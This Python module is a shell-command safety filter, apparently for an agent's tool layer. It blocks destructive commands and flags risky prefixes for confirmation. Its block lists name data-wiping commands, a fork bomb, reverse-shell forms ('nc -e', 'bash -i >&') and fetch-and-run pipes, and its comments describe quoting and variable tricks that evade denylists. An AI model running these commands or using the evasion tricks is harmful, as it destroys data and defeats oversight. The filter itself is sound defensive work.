"""Command blocklist and dangerous-prefix checks.

Lives in ``system`` so hooks and tools can share it without ``system``
importing ``tools`` (layering).
"""

from __future__ import annotations

import os
import re
import shlex
from typing import List, Optional

# Commands that are blocked by default for safety.
#
# NOTE: Blocklists are a *speed bump*, not real security — the actual safety
# comes from ``requires_confirmation`` plus the approval UX. We match against
# normalised tokens so things like ``echo "$(date)"`` are no longer blocked
# purely because they contain a ``$(`` substring.
#
# The shell-wrapper forms (``bash -c``, ``sh -c``, ``zsh -c``) are NOT in
# this list — ``_extract_inner_command`` peels them off and re-checks the
# inner command.
BLOCKED_PATTERNS = [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /*",
    "rm -r -f /",
    "rm -r -f ~",
    "rm -r -f /*",
    "rm -rf --no-preserve-root /",
    "mkfs",
    "/sbin/mkfs",
    "mkfs.",
    "dd if=/",
    "dd if ~",
    ":(){:|:&};:",  # fork bomb
    "> /dev/sda",
    "> /dev/sdb",
    "> /dev/hda",
    "chmod -R 777 /",
    "chmod -R 777 /*",
    "chmod 777 /",
    "shutdown",
    "/sbin/shutdown",
    "systemctl poweroff",
    "reboot",
    "systemctl reboot",
    "halt",
    "base64 -d",
    "base64 --decode",
    "nc -e",
    "bash -i >&",
]

_RM_DESTRUCTIVE_REGEX = re.compile(r"\brm\s+.*(?:-r|-f|--recursive|--force).*(?:/|~)\b")


def _build_blocked_regexes(patterns: list[str]) -> list[re.Pattern[str]]:
    """Precompile blocked-pattern regexes with token-boundary matching.

    The boundary anchors prevent a pattern like ``"rm -rf /"`` from matching
    against ``"rm -rf /tmp/build"`` while still catching the bare form.
    """
    return [re.compile(r"(?:^|\s)" + re.escape(p) + r"(?:\s|$)") for p in patterns]


_BLOCKED_REGEXES = _build_blocked_regexes(BLOCKED_PATTERNS)

# Patterns that indicate piping a network fetch straight into a shell.
# Matched against a whitespace-normalised lowercase command.
_PIPE_TO_SHELL_RE = re.compile(r"\b(curl|wget)\b[^|]*\|\s*(sh|bash|zsh|fish|python[23]?|node)\b")

# ── Post-tokenization argv blocklist (Phase 1.1) ─────────────────────────────
#
# The string-regex checks above match the *raw* command, but the shell (or
# ``shlex.split`` on the exec path) re-tokenizes before anything runs. That
# gap lets ``r""m -rf /``, ``rm -r""f /``, ``X=rm; $X -rf /`` and ``$IFS``
# tricks slip past a raw-string denylist and then execute the real command.
# ``_argv_is_blocked`` re-derives the *effective* argv the way the shell will,
# and matches the denylist against each pipeline segment's ``argv[0]``.

# Binaries that are catastrophic regardless of their arguments.
_BLOCKED_BINARIES = frozenset({"mkfs", "shutdown", "reboot", "halt", "poweroff", "init"})

# Bare targets that turn a recursive/forced ``rm`` into a wipe of root, home,
# or the whole working directory. The pre-existing regex only caught ``/``/``~``.
_DESTRUCTIVE_RM_TARGETS = frozenset({"/", "~", "~/", "/*", ".", "./", "*", "..", "../"})

# Shells / interpreters that can execute a just-downloaded script file. Used to
# catch the split fetch-then-exec form (``curl -o x evil && sh x``).
_SHELL_AND_INTERP = frozenset(
    {
        "sh",
        "bash",
        "zsh",
        "fish",
        "dash",
        "ksh",
        "csh",
        "tcsh",
        "python",
        "python2",
        "python3",
        "node",
        "bun",
        "deno",
        "perl",
        "ruby",
        "php",
        "lua",
    }
)


def _tokenize_pipeline_segments(command: str) -> Optional[List[List[str]]]:
    """Split *command* into per-command argv lists, respecting quotes.

    Returns ``None`` when the command cannot be parsed (e.g. unbalanced
    quotes) — the caller treats *unparseable* as *block-by-default*.
    """
    lex = shlex.shlex(command, posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    try:
        tokens = list(lex)
    except ValueError:
        return None

    separators = {";", "|", "||", "&", "&&", "|&", "\n"}
    segments: List[List[str]] = []
    current: List[str] = []
    for tok in tokens:
        if tok in separators:
            if current:
                segments.append(current)
                current = []
        else:
            current.append(tok)
    if current:
        segments.append(current)
    return segments


def _is_destructive_rm(argv: List[str]) -> bool:
    """True if *argv* is an ``rm`` that would wipe root/home/cwd."""
    base = os.path.basename(argv[0]).lower()
    if base != "rm":
        return False
    has_recursive_force = False
    targets: List[str] = []
    for arg in argv[1:]:
        al = arg.lower()
        if al in ("--recursive", "--force", "--no-preserve-root"):
            has_recursive_force = True
        elif arg.startswith("-") and not arg.startswith("--"):
            if "r" in al[1:] or "f" in al[1:]:
                has_recursive_force = True
        elif not arg.startswith("-"):
            targets.append(arg)
    if not has_recursive_force:
        return False
    return any(t in _DESTRUCTIVE_RM_TARGETS for t in targets)


def _argv0_blocked_binary(argv: List[str]) -> bool:
    """True if the command name is an always-blocked binary."""
    base = os.path.basename(argv[0]).lower()
    if base in _BLOCKED_BINARIES or base.startswith("mkfs."):
        return True
    if base == "dd":
        for arg in argv[1:]:
            al = arg.lower()
            if al.startswith("if=/") or al.startswith("of=/dev") or al.startswith("of=/"):
                return True
    return False


def _fetched_output_files(argv: List[str]) -> set[str]:
    """Basenames of files a ``curl``/``wget`` argv writes to disk."""
    base = os.path.basename(argv[0]).lower()
    if base not in ("curl", "wget"):
        return set()
    files: set[str] = set()
    for i, arg in enumerate(argv):
        if arg in ("-o", "--output", "--output-document", "-O") and i + 1 < len(argv):
            files.add(os.path.basename(argv[i + 1]))
        elif arg.startswith("-o") and len(arg) > 2:
            files.add(os.path.basename(arg[2:]))
        elif arg.startswith("--output="):
            files.add(os.path.basename(arg.split("=", 1)[1]))
        elif arg.startswith("--output-document="):
            files.add(os.path.basename(arg.split("=", 1)[1]))
    return files


def _is_split_fetch_exec(segments: List[List[str]]) -> bool:
    """Catch ``curl -o /tmp/x evil && sh /tmp/x`` split across segments."""
    fetched: set[str] = set()
    for argv in segments:
        if argv:
            fetched |= _fetched_output_files(argv)
    if not fetched:
        return False
    for argv in segments:
        if not argv:
            continue
        if os.path.basename(argv[0]).lower() in _SHELL_AND_INTERP:
            if any(os.path.basename(a) in fetched for a in argv[1:]):
                return True
    return False


def _argv_is_blocked(command: str) -> bool:
    """Evaluate the denylist against the *effective* argv the shell will run."""
    segments = _tokenize_pipeline_segments(command)
    if segments is None:
        # Unparseable (unbalanced quotes / hostile quoting) → fail closed.
        return True
    for argv in segments:
        if not argv:
            continue
        # A command *name* built from a variable or substitution
        # (``$X``, ``${IFS}...``, ``$(...)``, backticks) can hide anything.
        if "$" in argv[0] or "`" in argv[0]:
            return True
        if _argv0_blocked_binary(argv):
            return True
        if _is_destructive_rm(argv):
            return True
    return _is_split_fetch_exec(segments)


# Commands that require user confirmation
DANGEROUS_PREFIXES = [
    "rm ",
    "rmdir ",
    "sudo ",
    "chmod ",
    "chown ",
    "mv /",
    "dd ",
    "kill ",
    "killall ",
    "pkill ",
    "apt ",
    "apt-get ",
    "brew ",
    "curl ",
    "wget ",
    "docker rm",
    "docker rmi",
]


def _normalize_command(command: str) -> str:
    """Normalize command for safety checks: strip, collapse whitespace, lowercase."""
    return re.sub(r"\s+", " ", command.strip()).lower()


# Shells that can wrap arbitrary commands — we extract the inner command
# and re-check it against the blocklist/dangerous prefixes.
_SHELL_WRAPPERS = (
    "bash -c ",
    "sh -c ",
    "zsh -c ",
    "/bin/bash -c ",
    "/bin/sh -c ",
    "/bin/zsh -c ",
)


def _extract_inner_command(cmd_lower: str) -> Optional[str]:
    """If the command invokes a shell wrapper, extract and return the inner command."""
    for prefix in _SHELL_WRAPPERS:
        if cmd_lower.startswith(prefix):
            inner = cmd_lower[len(prefix) :].strip()
            # Strip surrounding quotes if present
            if len(inner) >= 2 and inner[0] in ('"', "'") and inner[-1] == inner[0]:
                inner = inner[1:-1]
            return inner
    return None


def is_command_blocked(command: str) -> bool:
    """Check if a command is in the blocklist.

    Normalizes whitespace, lowercases, and recursively checks commands
    wrapped in shell invocations like ``bash -c '...'``.
    """
    cmd_lower = _normalize_command(command)

    if any(r.search(cmd_lower) for r in _BLOCKED_REGEXES):
        return True

    if _RM_DESTRUCTIVE_REGEX.search(cmd_lower):
        return True

    if _PIPE_TO_SHELL_RE.search(cmd_lower):
        return True

    # Re-derive and check the effective argv (catches quote-splitting,
    # ``$VAR`` / ``$(...)`` command-name indirection, bare-cwd ``rm``, and the
    # split fetch-then-exec form). Runs against the raw command so basenames
    # survive case tricks; comparisons lowercase internally.
    if _argv_is_blocked(command):
        return True

    # Check inner command for shell wrappers
    inner = _extract_inner_command(cmd_lower)
    if inner is not None:
        return is_command_blocked(inner)

    return False


def is_command_dangerous(command: str) -> bool:
    """Check if a command should require confirmation."""
    cmd_lower = _normalize_command(command)

    # Strip leading directory components so /bin/rm → rm
    first_token = cmd_lower.split(" ", 1)[0]
    basename = first_token.rsplit("/", 1)[-1]
    cmd_for_check = (
        cmd_lower if basename == first_token else basename + cmd_lower[len(first_token) :]
    )

    if any(cmd_lower.startswith(prefix) for prefix in DANGEROUS_PREFIXES):
        return True
    if basename != first_token and any(
        cmd_for_check.startswith(prefix) for prefix in DANGEROUS_PREFIXES
    ):
        return True

    inner = _extract_inner_command(cmd_lower)
    if inner is not None:
        return is_command_dangerous(inner)

    return False
